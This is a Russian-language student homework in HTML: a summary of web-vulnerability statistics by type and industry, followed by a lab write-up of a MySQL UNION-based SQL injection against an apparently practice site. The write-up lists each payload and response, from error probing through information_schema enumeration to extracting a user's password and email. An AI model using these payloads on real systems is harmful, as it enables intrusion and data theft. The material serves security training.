@@ -1,0 +1,190 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="-1">ДЗ 1</h1>
+<h2 id="-1-">Часть 1. Анализ веб-уязвимостей</h2>
+<h3 id="1-">1. Использованные источники</h3>
+<ol>
+<li>Verizon  <a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></li>
+<li>Cloudflare <a href="https://www.cloudflare.com/application-security-report/">https://www.cloudflare.com/application-security-report/</a></li>
+<li><p>Edgescan <a href="https://www.edgescan.com/vulnerability-stats-report/">https://www.edgescan.com/vulnerability-stats-report/</a></p>
+</li>
+<li><p>Positive Technologies <a href="https://ptsecurity.com/ru-ru/research/analytics/">https://ptsecurity.com/ru-ru/research/analytics/</a></p>
+</li>
+<li>BI.ZONE <a href="https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/">https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/</a></li>
+<li>F.A.C.C.T. <a href="https://www.facct.ru/analytics/">https://www.facct.ru/analytics/</a></li>
+</ol>
+<hr>
+<h3 id="2-">2. Доля успешных атак через эксплуатацию веб-уязвимостей</h3>
+<p>Статистика сильно зависит от того, кого именно исследовали. Но общая тенденция одна: веб — это главная брешь в инфраструктуре многих компаний.</p>
+<p><strong>Мировая статистика:</strong></p>
+<ul>
+<li><strong>Общий срез (Verizon DBIR 2025):</strong> Около <strong>20-25%</strong> всех подтвержденных утечек данных в мире начинаются с эксплуатации веб-приложений.</li>
+<li><strong>Трафик и API (Cloudflare):</strong> Более <strong>60%</strong> всего динамического трафика сейчас приходится на API. При этом около <strong>12%</strong> всех HTTP-запросов к API классифицируются ИБ-системами как вредоносные попытки эксплуатации уязвимостей.</li>
+</ul>
+<p><strong>Статистика по России и СНГ (Positive Technologies &amp; F.A.C.C.T.):</strong></p>
+<ul>
+<li>В среднем в <strong>31-35%</strong> случаев исходным вектором успешной атаки на корпоративную сеть становятся веб-уязвимости.</li>
+<li>Уязвимости на сетевом периметре (в основном это публичные веб-интерфейсы почты, VPN-шлюзов и корпоративных мессенджеров) позволили хакерам проникнуть внутрь в <strong>43%</strong> расследованных инцидентов.</li>
+</ul>
+<p><strong>Scope по размеру компаний:</strong></p>
+<ul>
+<li><strong>Малый и средний бизнес (SMB):</strong> Их чаще ломают через обычный фишинг, поэтому доля веб-уязвимостей составляет всего <strong>~15%</strong>.</li>
+<li><strong>Крупный бизнес (Enterprise / IT):</strong> Доля успешных атак через веб-уязвимости достигает <strong>45%</strong>, так как у корпораций выставлено наружу огромное количество сервисов и микросервисов, за которыми сложно следить.</li>
+</ul>
+<hr>
+<h3 id="3-">3. Распределение по конкретным уязвимостям</h3>
+<p>Хакеры всё реже используют сложные цепочки эксплойтов и всё чаще бьют по проблемам с логикой доступа (Broken Access Control) и старым добрым инъекциям.</p>
+<p><strong>Глобальное распределение (по данным Edgescan и OWASP на 2025 год):</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Тип уязвимости</th>
+<th style="text-align:left">Доля (%)</th>
+<th style="text-align:left">Описание / В чем опасность</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>Broken Access Control</strong></td>
+<td style="text-align:left">29%</td>
+<td style="text-align:left">Нарушение контроля доступа. Пользователь может получить доступ к админке или чужим данным (например, уязвимости IDOR/BOLA).</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>SQL Injection</strong></td>
+<td style="text-align:left">19%</td>
+<td style="text-align:left">Выполнение произвольных запросов к БД. Ведет к краже или удалению баз данных.</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Cross-Site Scripting (XSS)</strong></td>
+<td style="text-align:left">15%</td>
+<td style="text-align:left">Выполнение скриптов в браузере жертвы. Обычно используется для воровства cookie-файлов и сессий.</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Security Misconfiguration</strong></td>
+<td style="text-align:left">12%</td>
+<td style="text-align:left">Небезопасная настройка: забытые дефолтные пароли, открытые порты, оставленные панели отладки (debug).</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Vulnerable Components</strong></td>
+<td style="text-align:left">10%</td>
+<td style="text-align:left">Использование устаревших библиотек и фреймворков с известными багами (Supply Chain атаки).</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Распределение конкретных веб-атак в России (по данным BI.ZONE):</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Тип атаки / Уязвимость</th>
+<th style="text-align:left">Доля от общего числа веб-атак (%)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Remote Code Execution (RCE - удаленное выполнение кода)</td>
+<td style="text-align:left">36%</td>
+</tr>
+<tr>
+<td style="text-align:left">Path traversal (Доступ к системным файлам)</td>
+<td style="text-align:left">16%</td>
+</tr>
+<tr>
+<td style="text-align:left">XSS (Кража данных посетителей)</td>
+<td style="text-align:left">14%</td>
+</tr>
+<tr>
+<td style="text-align:left">SQL-инъекции</td>
+<td style="text-align:left">10%</td>
+</tr>
+<tr>
+<td style="text-align:left">Прочие (SSRF, XXE, логические ошибки)</td>
+<td style="text-align:left">24%</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="4-scope-">4. Отраслевая специфика (Scope по индустриям)</h3>
+<p>Выбор уязвимости для атаки сильно зависит от сферы деятельности компании-жертвы:</p>
+<ul>
+<li><strong>Финансовый сектор (Банки):</strong> Меньше всего страдают от классических SQL-инъекций (около 11%), так как защита баз данных там выстроена хорошо. Зато они главная мишень для <strong>атак на логику API</strong> — хакеры пытаются манипулировать балансом или красть данные клиентов в обход интерфейса.</li>
+<li><strong>Медицина:</strong> <strong>53%</strong> всех успешных веб-атак приходится на <strong>RCE</strong>. Злоумышленники легко ломают старые веб-интерфейсы медицинского оборудования и слабозащищенные порталы для пациентов.</li>
+<li><strong>Транспорт и логистика:</strong> <strong>73%</strong> атак — это попытки несанкционированного доступа к файлам (<strong>Path traversal</strong>), чтобы скачать путевые листы, базы клиентов или логи серверов.</li>
+<li><strong>Государственные организации:</strong> <strong>66%</strong> атак используют <strong>XSS</strong>. Атакуют сайты региональных ведомств для кражи сессий авторизованных пользователей.</li>
+<li><strong>E-commerce (Ритейл):</strong> Эта отрасль чаще других страдает от <strong>SQL-инъекций (26%)</strong>, так как интернет-магазины завязаны на огромные, часто самописные базы товаров, скидок и пользователей.</li>
+</ul>
+<h2 id="-2">Часть 2</h2>
+<p><strong>Цель:</strong> Получить данные пользователей <code>Volk2</code> и <code>Vinni-pukh</code>.</p>
+<hr>
+<h3 id="1-id">1. Ищем нужные id</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=1</li>
+<li><strong>Ответ:</strong> Ваш id:1
+Ваш логин:admin</li>
+<li><strong>Запрос:</strong> ?id=4</li>
+<li><strong>Ответ:</strong> Ваш id:4
+Ваш логин:Vinni-pukh</li>
+<li><strong>Запрос:</strong> ?id=9</li>
+<li><strong>Ответ:</strong> Ваш id:9
+Ваш логин:Volk2</li>
+<li><strong>Запрос:</strong> ?id=1&#39;</li>
+<li><strong>Ответ:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MySQL...</li>
+<li><strong>Комментарий:</strong> Теперь мы знаем, что это MySQL</li>
+</ul>
+<h3 id="2-id-1-order-by-i-">2. Подбор количества столбцов(?id=1&#39; ORDER BY i-- +)</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=1&#39; ORDER BY 5-- +</li>
+<li><strong>Ответ:</strong> Unknown column &#39;5&#39; in &#39;order clause&#39;</li>
+<li><strong>Комментарий:</strong> Слишком много.</li>
+<li><strong>Запрос:</strong> ?id=1&#39; ORDER BY 3-- +</li>
+<li><strong>Ответ:</strong> Ваш id:1
+Ваш логин:admin</li>
+<li><strong>Комментарий:</strong> Ошибки нет, значит, в таблице 3 столбца.</li>
+</ul>
+<h3 id="3-union">3. Вывод данных через UNION</h3>
+<ul>
+<li><strong>Комментарий:</strong> Берём id =-1, тк если данные есть, то выводятся они</li>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT 1,2,3-- +</li>
+<li><strong>Ответ:</strong> Ваш id:1
+Ваш логин:2</li>
+<li><strong>Комментарий:</strong> Данные выводятся во 2 столбец (логин) и 1 (id). 3 столбец не виден на странице.</li>
+</ul>
+<h3 id="4-">4. Поиск таблиц</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT GROUP_CONCAT(table_name), 1, 3 FROM information_schema.tables WHERE table_schema=database()-- +</li>
+<li><strong>Ответ:</strong> Ваш id:emails,users
+Ваш логин:1</li>
+<li><strong>Комментарий:</strong> Нашли две таблицы emails и users</li>
+</ul>
+<h3 id="5-">5. Поиск колонок</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT GROUP_CONCAT(column_name), 2, 3 FROM information_schema.columns WHERE table_name=&#39;users&#39;-- +</li>
+<li><strong>Ответ:</strong> Ваш id:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+Ваш логин:2</li>
+<li><strong>Комментарий:</strong> Нашли столбец password.</li>
+</ul>
+<h3 id="6-volk2">6. Получение пароля Volk2</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT username, password, 3 FROM users WHERE username=&#39;Volk2&#39;-- +</li>
+<li><strong>Ответ:</strong> Ваш id:Volk2
+Ваш логин:Wa spoiuuuuu</li>
+<li><strong>Комментарий:</strong> <code>Пароль Volk2: Wa spoiuuuuu</code>.</li>
+</ul>
+<h3 id="7-vinni-pukh">7. Поиск почты Vinni-pukh</h3>
+<ul>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT GROUP_CONCAT(column_name), 2, 3 FROM information_schema.columns WHERE table_name=&#39;emails&#39;-- +</li>
+<li><strong>Ответ:</strong> Ваш id:id,email_id
+Ваш логин:2</li>
+<li><strong>Комментарий:</strong> Есть столбцы id и email_id</li>
+<li><strong>Запрос:</strong> ?id=-1&#39; UNION SELECT id, email_id, 3 FROM emails WHERE id=4-- +</li>
+<li><strong>Ответ:</strong> Ваш id:4
+Ваш логин:honey_lover@otus-lab.com</li>
+<li><strong>Комментарий:</strong> <code>Почта Vinni-pukh: honey_lover@otus-lab.com</code>.</li>
+</ul>
+<hr>
+<p><strong>Итог:</strong></p>
+<ol>
+<li><strong>Volk2:</strong> <code>Wa spoiuuuuu</code></li>
+<li><strong>Vinni-pukh:</strong> <code>honey_lover@otus-lab.com</code></li>
+</ol>
+</body></html>
